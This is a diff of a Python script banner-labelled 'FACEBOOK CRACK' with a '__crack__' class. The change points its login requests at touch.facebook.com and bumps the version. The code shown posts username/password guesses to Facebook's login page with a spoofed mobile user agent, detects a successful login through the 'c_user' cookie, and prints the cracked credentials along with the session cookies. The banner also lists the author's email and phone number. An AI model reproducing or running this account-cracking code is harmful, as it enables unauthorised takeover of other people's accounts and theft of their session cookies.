@@ -97,12 +97,12 @@ logo = '''\033[0;92m programmer by:SHINZY \033[0m
 \033[0;92m|____/|_| |_|_|_| |_/_/\_\/____\__, | \033[0m
 \033[0;92m                               |___/ \033[0m \033[0;92mPREMIUM AKTIF \033[0m
 
- \033[0;91m INGAT YA MBAH SABON/MAS'RURI (ctrl+f) JANGAN LUPA😚\033[0m 　
+ \033[0;92m INGAT YA MBAH SABON/MAS'RURI (ctrl+f) JANGAN LUPA😚\033[0m 　
 　
  \033[0;93m [👉] Created by M.ZAINUL UMAM \033[0m
  \033[0;92m [👉] Email :zyshin41@gmail.com \033[0m
  \033[0;92m [👉] Bisnis:hig_rnh76@shinzy.com \033[0m
- \033[0;92m [👉] WA    :+6285740559154 \033[0m  \033[0;96mV4.1 \033[0m
+ \033[0;92m [👉] WA    :+6285740559154 \033[0m  \033[0;96mV4.2 \033[0m
    \033[0;91mFACEBOOK CRACK SUPPORTED BY\033[0m \033[0;93mSHIN_X_TEAM\033[0m'''
 
 lo_ngentod = '1714009362122228'
@@ -778,9 +778,9 @@ class __crack__:
             except (KeyError, IOError):
             	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
-            ses.headers.update({"Host":"mtouch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://mtouch.facebook.com")
-            b = ses.post("https://mtouch.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            ses.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://touch.facebook.com")
+            b = ses.post("https://touch.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
